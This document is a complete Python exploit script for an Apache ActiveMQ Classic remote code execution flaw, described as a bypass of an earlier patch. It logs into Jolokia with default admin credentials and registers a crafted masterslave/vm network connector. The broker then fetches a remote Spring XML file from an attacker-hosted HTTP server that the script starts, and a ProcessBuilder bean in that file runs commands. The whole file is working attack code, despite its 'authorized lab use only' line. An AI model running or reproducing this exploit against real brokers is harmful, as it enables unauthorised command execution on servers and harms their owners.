#!/usr/bin/env python3
"""
CVE-2026-42588 - Apache ActiveMQ Classic RCE via Jolokia addNetworkConnector
                 using the masterslave:// composite transport (patch-bypass of
                 CVE-2026-34197, whose vm:// trigger the 5.19.4/6.2.3 patch blocked).

Chain:
  Jolokia exec addNetworkConnector(
      "masterslave:(vm://<newbroker>?brokerConfig=xbean:http://attacker/poc.xml&create=true)")
    -> masterslave composite re-parses inner vm:// URI
    -> VMTransportFactory.doCompositeConnect: broker <newbroker> absent -> CREATE it
    -> brokerConfig=xbean:http://... -> XBeanBrokerFactory / ResourceXmlApplicationContext
    -> remote Spring XML eagerly instantiates ProcessBuilder bean -> command exec.

The 5.19.7 / 6.2.6 fix adds a scheme allow-list (DEFAULT_ALLOWED_SCHEMES="broker,properties")
in VMTransportFactory.validateBrokerCreationSchema() -> "xbean" rejected.

Authorized lab use only.
"""
import argparse, http.server, json, socketserver, sys, threading, time, urllib.request, os

def serve_xml(xml_path, port):
    directory = os.path.dirname(os.path.abspath(xml_path))
    fname = os.path.basename(xml_path)
    hits = {"n": 0}
    class H(http.server.SimpleHTTPRequestHandler):
        def translate_path(self, path):
            return os.path.join(directory, fname)  # serve the payload for any path
        def do_GET(self):
            hits["n"] += 1
            print(f"  [attacker-http] GET {self.path} (hit #{hits['n']})", flush=True)
            return super().do_GET()
        def log_message(self, *a): pass
    httpd = socketserver.ThreadingTCPServer(("0.0.0.0", port), H)
    httpd.daemon_threads = True
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd, hits

def jolokia_exec(base, user, pw, mbean, op, arg):
    url = f"{base}/api/jolokia/"
    body = json.dumps({"type": "EXEC", "mbean": mbean, "operation": op, "arguments": [arg]}).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Origin", base)  # satisfy Jolokia strict CORS check
    import base64
    req.add_header("Authorization", "Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode())
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return None, str(e)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://localhost:8161")
    ap.add_argument("--user", default="admin")
    ap.add_argument("--pass", dest="pw", default="admin")
    ap.add_argument("--lhost", default="host.docker.internal", help="attacker host as seen from broker")
    ap.add_argument("--lport", type=int, default=8889)
    ap.add_argument("--xml", default=os.path.join(os.path.dirname(__file__), "..", "attacker", "poc_42588.xml"))
    ap.add_argument("--broker-name", default="localhost")
    ap.add_argument("--evil-broker", default="evilbroker1")
    ap.add_argument("--scheme", default="static", help="discovery wrapper scheme: static | masterslave | fanout | ...")
    args = ap.parse_args()

    mbean = f"org.apache.activemq:brokerName={args.broker_name},type=Broker"
    payload_uri = (f"http://{args.lhost}:{args.lport}/poc.xml")
    inner = f"vm://{args.evil_broker}?brokerConfig=xbean:{payload_uri}&create=true"
    conn = f"{args.scheme}:({inner})"

    print("[*] CVE-2026-42588 ActiveMQ RCE (masterslave:// -> VMTransportFactory -> Spring XML)")
    print(f"[*] target      : {args.target}")
    print(f"[*] mbean       : {mbean}")
    print(f"[*] payload xml : {payload_uri}")
    print(f"[*] connector   : {conn}")

    httpd, hits = serve_xml(args.xml, args.lport)
    print(f"[*] attacker HTTP server listening on 0.0.0.0:{args.lport}")
    time.sleep(0.5)

    status, resp = jolokia_exec(args.target, args.user, args.pw, mbean, "addNetworkConnector(java.lang.String)", conn)
    print(f"[*] jolokia HTTP status: {status}")
    print(f"[*] jolokia response  : {resp[:400]}")

    print("[*] waiting for broker to fetch payload ...")
    for _ in range(20):
        time.sleep(0.5)
        if hits["n"] > 0:
            break
    print(f"[*] payload fetched {hits['n']} time(s) by broker")
    time.sleep(2)
    httpd.shutdown()
    print("[*] done. check /tmp/PROOF_42588 inside the container.")

if __name__ == "__main__":
    main()
